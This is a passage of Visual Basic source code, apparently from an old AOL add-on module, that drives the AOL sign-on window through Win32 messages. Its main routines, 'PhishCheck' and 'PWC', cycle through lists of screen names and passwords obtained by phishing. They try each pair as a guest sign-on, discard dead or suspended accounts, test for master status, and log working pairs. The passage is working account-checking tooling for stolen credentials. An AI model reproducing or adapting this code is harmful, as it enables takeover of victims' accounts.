    ReplaceCharacters$ = NewMain$
End Function


Public Function GetMessageText(MessageWindow As Long) As String
    Dim StaticWindow1 As Long, StaticWindow2 As Long, AolStatic1 As Long
    Dim AolStatic2 As Long
    StaticWindow1& = FindWindowEx(MessageWindow&, 0&, "Static", vbNullString)
    StaticWindow2& = FindWindowEx(MessageWindow&, StaticWindow1&, "Static", vbNullString)
    AolStatic1& = FindWindowEx(MessageWindow&, 0&, "_AOL_Static", vbNullString)
    AolStatic2& = FindWindowEx(MessageWindow&, AolStatic1&, "_AOL_Static", vbNullString)
    If StaticWindow2& <> 0& Then
        GetMessageText$ = gettext(StaticWindow2&)
       ElseIf AolStatic2& <> 0& Then
        GetMessageText$ = gettext(AolStatic2&)
    End If
End Function
Function PhishCheck(screenname As String, password As String, list, list2, chk, stat, mnucheckm1) As Boolean
    If FindSignOnScreen& = 0& Then Exit Function
    Dim MessageOk As Long, OKButton As Long, AolModal As Long
    Dim AolEdit1 As Long, AolEdit2 As Long, AolIcon1 As Long
    Dim AolIcon2 As Long
    stat.caption = "killing signon"
       Call AOL4_KillWin(FindSignOnScreen&)
       TimeOut (0.6)
           stat.caption = "opening singon"
       Call OpenSignOnScreEn
       TimeOut (0.5)
           stat.caption = "pleaze wait..."
           TimeOut (0.5)
           
    If chk.Checked = True Then stat.caption = "setting to guezt": TimeOut (0.2): Call GuestSetToGuest
    If chk.Checked = True Then TimeOut (0.6)
        stat.caption = "clikin signon"
    Call GuestClickSignOn
   TimeOut (1)
    Do: DoEvents
    stat.caption = "searchin..."
        AolModal& = FindWindow("_AOL_Modal", vbNullString)
        AolEdit1& = FindWindowEx(AolModal&, 0&, "_AOL_Edit", vbNullString)
        AolEdit2& = FindWindowEx(AolModal&, AolEdit1&, "_AOL_Edit", vbNullString)
        AolIcon2& = FindWindowEx(AolModal&, 0&, "_AOL_Icon", vbNullString)
    Loop Until AolModal& <> 0& And AolEdit1& <> 0& And AolEdit2& <> 0 And AolIcon2& <> 0&
    stat.caption = "setting sn-pw"
Call RePlacestRing(password$, "[s]", "")
Call RePlacestRing(password$, "[m]", "")
Call RePlacestRing(password$, "[e]", "")
Call RePlacestRing(password$, "[oh]", "")
    TimeOut (0.2)
    Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
    Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
    Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
        stat.caption = "checking..."
    Do: DoEvents
    MessageOk& = FindWindow("#32770", "America Online")
    Loop Until MessageOk& <> 0& Or FindWelcome& <> 0& Or FindGoodbyeTXT = 1
    
     
     If MessageOk& <> 0& Then
     If InStr(GetMessageText(MessageOk&), "Only one screen") Then GoTo iii
      If GetMessageText(MessageOk&) = "Incorrect name and/or password, please re-enter" Then
         'ded
             stat.caption = "<>< = dead"
             TimeOut (0.1)
                 stat.caption = "removing <><"
            list.RemoveItem list.ListIndex
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
            AolIcon2& = FindWindowEx(AolModal&, AolIcon2&, "_AOL_Icon", vbNullString)
            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
            Exit Function
           ElseIf GetMessageText(MessageOk&) = "suspended" Then
          'ded
              stat.caption = "<>< = dead"
              TimeOut (0.1)
                  stat.caption = "removing <><"
           list.RemoveItem list.ListIndex

            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
            AolIcon2& = FindWindowEx(AolModal&, AolIcon2&, "_AOL_Icon", vbNullString)
            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
            Exit Function
           ElseIf InStr(GetMessageText(MessageOk&), "Your account ") = 1& Then
                       'Call Click_OK("America Online")
iii:
    stat.caption = "<>< signed on"
          list2.AddItem list
          list.RemoveItem list.ListIndex
              stat.caption = ""
          waitforOK
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
            AolIcon2& = FindWindowEx(AolModal&, AolIcon2&, "_AOL_Icon", vbNullString)
            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
            Exit Function
        End If
       ElseIf FindWelcome& <> 0& Then
           stat.caption = "<>< active"
          TimeOut (0.5)
 If mnucheckm1.Checked = True Then stat.caption = "checking if <>< = M"
 If mnucheckm1.Checked = True Then TimeOut (1)
 If mnucheckm1.Checked = True Then Call Kill_Childz
 If mnucheckm1.Checked = True Then TimeOut (1.5)
 If mnucheckm1.Checked = True Then stat.caption = "pleaze wait..."
  If mnucheckm1.Checked = True Then TimeOut (1.5)
  If mnucheckm1.Checked = True Then stat.caption = "proceeding..."
  If mnucheckm1.Checked = True Then dE$ = izMaZter
 If dE$ = True Then list2.AddItem screenname$ + "-" + password$ + " [m]" Else list2.AddItem screenname$ + "-" + password$ + " [s]": GoTo lpl
 If mnucheckm1.Checked = True Then TimeOut (1)
          
          list2.AddItem list
lpl:
          list.RemoveItem list.ListIndex
          
              stat.caption = "<>< added"
              TimeOut (0.1)
                  stat.caption = "signing off"
           XAOL4_SignOff
terp:
        TimeOut (0.5)
        If FindSignOnScreen& <> 0& Then GoTo nex Else GoTo terp
      TimeOut (0.5)
nex:
Call ClicK_OK("America Online")
       Exit Function
      ElseIf FindGoodbyeTXT = 1 Then
          stat.caption = "<>< invalid"
       list.RemoveItem list.ListIndex
       Exit Function
      End If
          stat.caption = "awaiting command"
End Function
Sub PWC(screenname, password, active As Control, stp As Label, ddd)
'Call PWC(lstSN, lstPW, frmRezultZ.List1, lblSTOP, lstSN, DDD)
'ouwop
    If FindSignOnScreen& = 0& Then Exit Sub
    Dim MessageOk As Long, OKButton As Long, AolModal As Long
    Dim AolEdit1 As Long, AolEdit2 As Long, AolIcon1 As Long
    Dim AolIcon2 As Long
    Call GuestSetToGuest
    TimeOut (0.7)
    Call GuestClickSignOn
    Do: DoEvents
    If stp.caption = "a" Then GoTo percE
        AolModal& = FindWindow("_AOL_Modal", vbNullString)
        AolEdit1& = FindWindowEx(AolModal&, 0&, "_AOL_Edit", vbNullString)
        AolEdit2& = FindWindowEx(AolModal&, AolEdit1&, "_AOL_Edit", vbNullString)
        AolIcon2& = FindWindowEx(AolModal&, 0&, "_AOL_Icon", vbNullString)
    Loop Until AolModal& <> 0& And AolEdit1& <> 0& And AolEdit2& <> 0 And AolIcon2& <> 0&
Call RePlacestRing(password, "[s]", "")
Call RePlacestRing(password, "[m]", "")
Call RePlacestRing(password, "[e]", "")
Call RePlacestRing(password, "[oh]", "")
    TimeOut (0.2)
    Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname)
    Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password)
    Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
    Do: DoEvents
    If stp.caption = "a" Then GoTo percE
        MessageOk& = FindWindow("#32770", "America Online")
    Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
    If MessageOk& <> 0& Then
        If GetMessageText(MessageOk&) = "Incorrect name and/or password, please re-enter" Then
         'ded
            'list.RemoveItem list.ListIndex
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
            AolIcon2& = FindWindowEx(AolModal&, AolIcon2&, "_AOL_Icon", vbNullString)
            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
            Exit Sub
            ElseIf GetMessageText(MessageOk&) = "suspended" Then
          'ded
           lst.AddItem screenname + "-" + password
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
            AolIcon2& = FindWindowEx(AolModal&, AolIcon2&, "_AOL_Icon", vbNullString)
            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
            Exit Sub
           ElseIf InStr(GetMessageText(MessageOk&), "Your account ") = 1& Then
          'Call Click_OK("America Online")
          lst.AddItem screenname + "-" + password
          waitforOK
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
            AolIcon2& = FindWindowEx(AolModal&, AolIcon2&, "_AOL_Icon", vbNullString)
            Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
            Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
            Exit Sub
        End If
       ElseIf FindWelcome& <> 0& Then
 TimeOut (1)
 Call Kill_Childz
 TimeOut (2)
 dE$ = izMaZter
 If dE$ = True Then active.AddItem screenname + "-" + password + " [m]" Else active.AddItem screenname + "-" + password + " [s]"
TimeOut (1)
           ddd = "1"
           XAOL4_SignOff
terp:
        TimeOut (0.5)
         If stp.caption = "a" Then GoTo percE
        If FindSignOnScreen& <> 0& Then GoTo nex Else GoTo terp
      TimeOut (0.5)
       If stp.caption = "a" Then GoTo percE
nex:
Call ClicK_OK("America Online")
        Exit Sub
    End If
percE:
End Sub


Public Function ClassInstance(ParentWindow As Long, ClassWindow As String) As Long
     Dim OnInstance As Long, CurrentCount As Long
     If FindWindowEx(ParentWindow&, 0&, ClassWindow$, vbNullString) = 0& Then Exit Function
     ClassInstance& = 0&
     Do: DoEvents
         OnInstance& = FindWindowEx(ParentWindow&, OnInstance&, ClassWindow$, vbNullString)
         If OnInstance& <> 0& Then
             CurrentCount& = CurrentCount& + 1
            Else
             Exit Do
         End If
     Loop
     ClassInstance& = CurrentCount&
End Function
Public Function NextOfClassByCount(ParentWindow As Long, ClassWindow As String, ByCount As Long) As Long
    Dim NextOfClass As Long, NextWindow As Long
    If ByCount& > ClassInstance(ParentWindow&, ClassWindow$) Then Exit Function
    If FindWindowEx(ParentWindow&, 0&, ClassWindow$, vbNullString) = 0& Then Exit Function
    For NextOfClass& = 1 To ByCount&
        NextWindow& = FindWindowEx(ParentWindow&, NextWindow&, ClassWindow$, vbNullString)
    Next NextOfClass&
    NextOfClassByCount& = NextWindow&
End Function
Public Sub GuestClickSignOn()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
icona% = FindChildByClass(chil%, "_aol_icon")
stat% = FindChildByClass(chil%, "_AOL_Static")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
stat3% = GetWindow(stat2%, GW_HWNDNEXT)
stat4% = GetWindow(stat3%, GW_HWNDNEXT)
iCon2% = GetWindow(icona%, GW_HWNDNEXT)
iCon3% = GetWindow(iCon2%, GW_HWNDNEXT)
iCon4% = GetWindow(iCon3%, GW_HWNDNEXT)
iCon5% = GetWindow(iCon4%, GW_HWNDNEXT)
iCon6% = GetWindow(iCon5%, GW_HWNDNEXT)
iCon7% = GetWindow(iCon6%, GW_HWNDNEXT)
iCon8% = GetWindow(iCon7%, GW_HWNDNEXT)
iCon9% = GetWindow(iCon8%, GW_HWNDNEXT)
If FindAwin("Sign On") Then
If gettext(iCon2%) = "SIGN ON" Then Call cLickiCoN(iCon2%): Exit Sub
If gettext(iCon3%) = "SIGN ON" Then Call cLickiCoN(iCon3%): Exit Sub
If gettext(iCon4%) = "SIGN ON" Then Call cLickiCoN(iCon4%): Exit Sub
If gettext(iCon5%) = "SIGN ON" Then Call cLickiCoN(iCon5%): Exit Sub
If gettext(iCon6%) = "SIGN ON" Then Call cLickiCoN(iCon6%): Exit Sub
If gettext(iCon7%) = "SIGN ON" Then Call cLickiCoN(iCon7%): Exit Sub
If gettext(iCon8%) = "SIGN ON" Then Call cLickiCoN(iCon8%): Exit Sub
If gettext(iCon9%) = "SIGN ON" Then Call cLickiCoN(iCon9%): Exit Sub
If gettext(iCon2%) = "SIGN ON" Then Call cLickiCoN(iCon2%): Exit Sub
If gettext(iCon3%) = "SIGN ON" Then Call cLickiCoN(iCon3%): Exit Sub
If gettext(iCon4%) = "SIGN ON" Then Call cLickiCoN(iCon4%): Exit Sub
If gettext(iCon5%) = "SIGN ON" Then Call cLickiCoN(iCon5%): Exit Sub
If gettext(iCon6%) = "SIGN ON" Then Call cLickiCoN(iCon6%): Exit Sub
If gettext(iCon7%) = "SIGN ON" Then Call cLickiCoN(iCon7%): Exit Sub
If gettext(iCon8%) = "SIGN ON" Then Call cLickiCoN(iCon8%): Exit Sub
If gettext(iCon9%) = "SIGN ON" Then Call cLickiCoN(iCon9%): Exit Sub

Else
TimeOut (0.9)
End If
If FindAwin("Goodbye from America Online!") Then
If gettext(iCon2%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon2%): Exit Sub
If gettext(iCon3%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon3%): Exit Sub
If gettext(iCon4%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon4%): Exit Sub
If gettext(iCon5%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon5%): Exit Sub
If gettext(iCon6%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon6%): Exit Sub
If gettext(iCon7%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon7%): Exit Sub
If gettext(iCon8%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon8%): Exit Sub
If gettext(iCon9%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon9%): Exit Sub
If gettext(iCon2%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon2%): Exit Sub
If gettext(iCon3%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon3%): Exit Sub
If gettext(iCon4%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon4%): Exit Sub
If gettext(iCon5%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon5%): Exit Sub
If gettext(iCon6%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon6%): Exit Sub
If gettext(iCon7%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon7%): Exit Sub
If gettext(iCon8%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon8%): Exit Sub
If gettext(iCon9%) = "SIGN ON AGAIN" Then Call cLickiCoN(iCon9%): Exit Sub
Else
TimeOut (0.4)
End If

    
End Sub
Function FindGoodbyeTXT()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
stat% = FindChildByClass(chil%, "RICHCNTL")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
If FindSignOnScreen& <> 0& Then
If InStr(gettext(stat2%), "Invalid") Then FindGoodbyeTXT = 1 Else FindGoodbyeTXT = 0


Else
End If
End Function

Public Sub AOL25_GuestClickSignOn()
'ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
icona% = FindChildByClass(chil%, "_aol_icon") 'sign on
stat% = FindChildByClass(chil%, "_AOL_Static")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
stat3% = GetWindow(stat2%, GW_HWNDNEXT)
stat4% = GetWindow(stat3%, GW_HWNDNEXT)
stat5% = GetWindow(stat4%, GW_HWNDNEXT)
stat6% = GetWindow(stat5%, GW_HWNDNEXT)
stat7% = GetWindow(stat6%, GW_HWNDNEXT) 'pw WELCOME
stat8% = GetWindow(stat7%, GW_HWNDNEXT) 'pw GO0dByE
 iCon2% = GetWindow(icona%, GW_HWNDNEXT)
 iCon3% = GetWindow(iCon2%, GW_HWNDNEXT)
 iCon4% = GetWindow(iCon3%, GW_HWNDNEXT) 'copyright
If FindAwin("Welcome") Then
If gettext(icona%) = "Sign On" Then Call SendMessageByNum(stat7%, WM_CHAR, 13, 0)
TimeOut (0.1)
Call ClicK_OK("America Online")
TimeOut (0.1)
If gettext(icona%) = "Sign On" Then Clicker (stat7%)
Else
TimeOut (0.1)
End If
If FindAwin("Goodbye from America Online!") Then
If gettext(icona%) = "Sign On" Then Clicker (stat8%)
TimeOut (0.1)
Call ClicK_OK("America Online")
Else
TimeOut (0.1)
End If
  
End Sub





 Sub GuestSetSnAndPw(sn, pw)
Call RePlacestRing(pw, "[s]", "")
Call RePlacestRing(pw, "[m]", "")
Call RePlacestRing(pw, "[e]", "")
Call RePlacestRing(pw, "[oh]", "")
    
    Dim AolModal As Long, AolEdit1 As Long, AolEdit2 As Long
    AolModal& = FindWindow("_AOL_Modal", vbNullString)
    AolEdit1& = FindWindowEx(AolModal&, 0&, "_AOL_Edit", vbNullString)
    AolEdit2& = FindWindowEx(AolModal&, AolEdit1&, "_AOL_Edit", vbNullString)
    Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, sn)
    Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, pw)
TimeOut (0.2)
End Sub
Public Function ComboCount(ComboBox As Long) As Long
    ComboCount& = SendMessageLong(ComboBox&, CB_GETCOUNT, 0&, 0&)
End Function



Public Sub GuestSetToGuest()
Dim ComboBox As Long
terp:
   If FindSignOnScreen& = 0& Then Exit Sub
   ComboBox& = FindWindowEx(FindSignOnScreen&, 0&, "_AOL_Combobox", vbNullString)
   Call PostMessage(ComboBox&, WM_LBUTTONDOWN, 0&, 0&)
   Call PostMessage(ComboBox&, WM_LBUTTONUP, 0&, 0&)
   Call PostMessage(ComboBox&, WM_LBUTTONDOWN, 0&, 0&)
   Call PostMessage(ComboBox&, WM_LBUTTONUP, 0&, 0&)
   TimeOut (0.001)
   Call SendMessageLong(ComboBox&, CB_SETCURSEL, ComboCount(ComboBox&) - 1, 0&)
On Error GoTo NeeE
AppActivate "America  Online"
NeeE:
On Error Resume Next
AppActivate "Ouwop Online"
End Sub
Public Function FindSwitchWindow() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
   If getcaption(AOLChild&) = "Switch Screen Names" Then
        FindSwitchWindow& = AOLChild&
        Exit Function
    Else
      Do
        AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", vbNullString)
         If getcaption(AOLChild&) = "Switch Screen Names" Then
             FindSwitchWindow& = AOLChild&
             Exit Function
         End If
      Loop Until AOLChild& = 0&
   End If
    FindSwitchWindow& = AOLChild&
End Function



Public Function FindSignOnScreen() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim SignOnCaption As String
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
    SignOnCaption$ = getcaption(AOLChild&)
    If SignOnCaption$ = "Sign On" Or SignOnCaption$ = "Goodbye from America Online!" Then
        FindSignOnScreen& = AOLChild&
        Exit Function
       Else
        Do
            AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", vbNullString)
            If SignOnCaption$ = "Sign On" Or SignOnCaption$ = "Goodbye from America Online!" Then
                FindSignOnScreen& = AOLChild&
                Exit Function
            End If
        Loop Until AOLChild& = 0&
    End If
    FindSignOnScreen& = AOLChild&
End Function



Public Function FindGoodbyeWin() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim SignOnCaption As String
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
    SignOnCaption$ = getcaption(AOLChild&)
    If SignOnCaption$ = "Goodbye from America Online!" Then
        FindGoodbyeWin& = AOLChild&
        Exit Function
       Else
        Do
            AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", vbNullString)
            If SignOnCaption$ = "Goodbye from America Online!" Then
                FindGoodbyeWin& = AOLChild&
                Exit Function
            End If
        Loop Until AOLChild& = 0&
    End If
    FindGoodbyeWin& = AOLChild&
End Function

Public Function FindGoodByeScreen() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim SignOnCaption As String
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
    SignOnCaption$ = getcaption(AOLChild&)
    If SignOnCaption$ = "Sign On" Or SignOnCaption$ = "Goodbye from America Online!" Then
    FindGoodByeScreen& = AOLChild&
    Exit Function
End If
    FindGoodByeScreen& = AOLChild&

End Function


Public Function FindWelcome() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim WelcomeCaption As String
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
    Rich& = FindChildByClass(AOLChild&, "_AOL_Checkbox")

    WelcomeCaption$ = getcaption(AOLChild&)
   If InStr(WelcomeCaption$, "Welcome, ") <> 0& Then
        FindWelcome& = AOLChild&
        Exit Function
    Else
      Do
        AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", vbNullString)
        WelcomeCaption$ = getcaption(AOLChild&)
         If InStr(WelcomeCaption$, "Welcome, ") <> 0& Then
             FindWelcome& = AOLChild&
             Exit Function
         End If
      Loop Until AOLChild& = 0&
   End If
    FindWelcome& = AOLChild&
End Function


Public Sub GuestSignOn(screenname As String, password As String)
Call RePlacestRing(password$, "[s]", "")
Call RePlacestRing(password$, "[m]", "")
Call RePlacestRing(password$, "[e]", "")
Call RePlacestRing(password$, "[oh]", "")
top:
    TimeOut (0.0001)
    If IsUserOnline = 1 Then Call XAOL4_SignOff
    If FindSignOnScreen& = 0 Then GoTo top
    Dim MessageOk As Long, OKButton As Long, AolModal As Long
    Dim AolEdit1 As Long, AolEdit2 As Long, AolIcon1 As Long
    Dim AolIcon2 As Long
    Call GuestSetToGuest
    TimeOut (0.5)
    Call GuestClickSignOn
TimeOut (1)
    
    Do
    TimeOut (0.1)
    DoEvents
        AolModal& = FindWindow("_AOL_Modal", vbNullString)
        AolEdit1& = FindWindowEx(AolModal&, 0&, "_AOL_Edit", vbNullString)
        AolEdit2& = FindWindowEx(AolModal&, AolEdit1&, "_AOL_Edit", vbNullString)
        AolIcon2& = FindWindowEx(AolModal&, 0&, "_AOL_Icon", vbNullString)
    Loop Until AolModal& <> 0& And AolEdit1& <> 0& And AolEdit2& <> 0 And AolIcon2& <> 0&
    TimeOut (0.1)
    Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
    Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
    Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
    TimeOut (2)
    Do
    DoEvents:
    TimeOut (0.0000001)
    MessageOk& = FindWindow("#32770", "America Online")
    Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
    
    If MessageOk& <> 0& Then
        OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
        Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
        Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
        Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
        Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
     TimeOut (1)
        Exit Sub
       Do: DoEvents
    If MessageOk& <> 0& Then waitforOK: Exit Sub
          MessageOk& = FindWindow("#32770", "America Online")
     Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
     If MessageOk& <> 0& And OKButton& <> 0& Then
       ElseIf FindWelcome& <> 0& Then
       TimeOut (0.1)
       Exit Sub
       End If
End If
   End Sub
Public Sub GuestSignOn2(screenname As String, password As String, ddd As String)
Call RePlacestRing(password$, "[s]", "")
Call RePlacestRing(password$, "[m]", "")
Call RePlacestRing(password$, "[e]", "")
Call RePlacestRing(password$, "[oh]", "")
top:
    TimeOut (0.1)
    If IsUserOnline = 1 Then Call XAOL4_SignOff
    If FindSignOnScreen& <> 0& Then GoTo bot Else GoTo top
    TimeOut (0.1)
bot:
    Dim MessageOk As Long, OKButton As Long, AolModal As Long
    Dim AolEdit1 As Long, AolEdit2 As Long, AolIcon1 As Long
    Dim AolIcon2 As Long
    Call GuestSetToGuest
    TimeOut (0.2)
    Call GuestClickSignOn
TimeOut (1)
    
    Do
    TimeOut (0.3)
    DoEvents
        AolModal& = FindWindow("_AOL_Modal", vbNullString)
        AolEdit1& = FindWindowEx(AolModal&, 0&, "_AOL_Edit", vbNullString)
        AolEdit2& = FindWindowEx(AolModal&, AolEdit1&, "_AOL_Edit", vbNullString)
        AolIcon2& = FindWindowEx(AolModal&, 0&, "_AOL_Icon", vbNullString)
    Loop Until AolModal& <> 0& And AolEdit1& <> 0& And AolEdit2& <> 0 And AolIcon2& <> 0&
    TimeOut (0.1)
    Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
    Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
    Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
         TimeOut (1)
     Do
     DoEvents:
     TimeOut (0.00000000000001)
     MessageOk& = FindWindow("#32770", "America Online")
     Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
    
    If MessageOk& <> 0& Then
        OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
        Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
        Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
        Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
        Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
     ddd$ = "dead"
       Exit Sub
End If
    End Sub

Public Sub AOL25_GuestSignOn(screenname As String, password As String)
    If AOL25_FindSignOnScreeN = 0& Then Exit Sub
    Dim MessageOk As Long, OKButton As Long, AolModal As Long
    Dim AolEdit1 As Long, AolEdit2 As Long, AolIcon1 As Long
    Dim AolIcon2 As Long
    Call AOL25_GuesTtoGuesT
    TimeOut (0.5)
    Call AOL25_GuestClickSignOn
    TimeOut (0.5)
    Do: DoEvents
        AolModal& = FindWindow("_AOL_Modal", vbNullString)
        AolEdit1& = FindWindowEx(AolModal&, 0&, "_AOL_Edit", vbNullString)
        AolEdit2& = FindWindowEx(AolModal&, AolEdit1&, "_AOL_Edit", vbNullString)
        AolIcon2& = FindWindowEx(AolModal&, 0&, "_AOL_Button", vbNullString)
    okie& = GetWindow(AolIcon2&, GW_HWNDNEXT)
    Loop Until AolModal& <> 0& And AolEdit1& <> 0& And AolEdit2& <> 0 And AolIcon2& <> 0&
    Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
    Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
    If gettext(okie&) = "OK" Then Clicker (okie&)
    
    Do: DoEvents
    MessageOk& = FindWindow("#32770", "America Online")
    Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
    If MessageOk& <> 0& Then
        OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
        Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call SendMessageByString(AolEdit1&, WM_SETTEXT, 0&, screenname$)
        Call SendMessageByString(AolEdit2&, WM_SETTEXT, 0&, password$)
        Call PostMessage(AolIcon2&, WM_LBUTTONDOWN, 0&, 0&)
        Call PostMessage(AolIcon2&, WM_LBUTTONUP, 0&, 0&)
        Do: DoEvents
            MessageOk& = FindWindow("#32770", "America Online")
        Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
        If MessageOk& <> 0& And OKButton& <> 0& Then
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
